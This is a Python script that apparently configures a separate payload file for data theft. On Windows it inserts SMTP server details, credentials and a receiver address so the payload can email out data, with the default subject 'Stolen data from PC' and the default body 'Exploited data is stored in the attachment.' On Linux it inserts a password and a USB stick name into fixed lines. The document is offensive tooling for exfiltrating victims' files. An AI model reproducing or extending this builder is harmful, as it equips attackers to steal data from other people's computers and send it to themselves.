import sys

ARGS = sys.argv[1:]
SYSTEM_LIST = ["windows", "linux"]


def process_insert_win(payload_line, display_msg, field_name, default_value=None):
    value = input(display_msg % default_value if default_value else display_msg)
    return payload_line.replace(f"{field_name}", default_value if value == "" else value)


def process_insert_lnx(payload_line, display_msg, field_name):
    while True:
        value = input(display_msg)
        if value != "":
            return payload_line.replace(f"{field_name}", value), value


def windows_writer():
    payload = []
    try:
        with open(ARGS[1], 'r') as f:
            payload = f.readlines()

        payload[30] = process_insert_win(payload[30], "Select a SMTP server (default '%s'): ", "SMTP_SERVER",
                                         "smtp.mail.yahoo.com")
        payload[30] = process_insert_win(payload[30], "Select a SMTP server port (default '%s'): ", "SMTP_PORT", "587")
        payload[30] = process_insert_win(payload[30], "Select a SMTP server password: ", "SMTP_PASSWORD")
        payload[30] = process_insert_win(payload[30], "Select a SMTP server email: ", "SENDER_EMAIL")
        payload[30] = process_insert_win(payload[30], "Select a receiver email: ", "RECEIVER_EMAIL")
        payload[30] = process_insert_win(payload[30], "Select an email subject (default '%s'): ", "EMAIL_SUBJECT",
                                         "Stolen data from PC")
        payload[30] = process_insert_win(payload[30], "Select an email body (default '%s'): ", "EMAIL_BODY",
                                         "Exploited data is stored in the attachment.")
    except FileNotFoundError:
        exit(f"File '{ARGS[1]}' is missing.")

    with open(ARGS[1], 'w') as f:
        f.write(''.join(payload))


def linux_writer():
    payload = []
    try:
        with open(ARGS[1], 'r') as f:
            payload = f.readlines()

        payload[6], value = process_insert_lnx(payload[6], "Select you password: ", "PASSWORD")
        payload[8] = payload[8].replace("PASSWORD", value)
        payload[2], value = process_insert_lnx(payload[2], "Select you USB stick name: ", "USBSTICK")
        payload[10] = payload[10].replace("USBSTICK", value)
    except FileNotFoundError:
        exit(f"File '{ARGS[1]}' is missing.")

    with open(ARGS[1], 'w') as f:
        f.write(''.join(payload))


if not ARGS or len(ARGS) != 2 or ARGS[0] not in SYSTEM_LIST:
    exit("Unknown system argument(s) used.")

if ARGS[0] == SYSTEM_LIST[0]:
    windows_writer()
else:
    linux_writer()
